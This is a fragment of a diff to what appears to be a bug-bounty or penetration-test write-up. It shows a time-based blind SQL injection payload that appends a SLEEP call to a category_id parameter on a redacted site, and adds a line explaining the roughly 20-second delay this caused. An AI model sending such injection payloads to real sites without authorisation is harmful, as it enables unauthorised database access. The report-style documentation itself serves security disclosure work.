@@ -49,7 +49,7 @@ I sent this payload:
 https://redacted.com/products?category_id=15+AND+`SLEEP()`--
 ```
 
-The response took a little over 20 seconds to come back. 
+After adding 20 inside the sleep function the response took a little over 20 seconds to come back. 
 
 ```http
 HTTP/1.1 200 OK
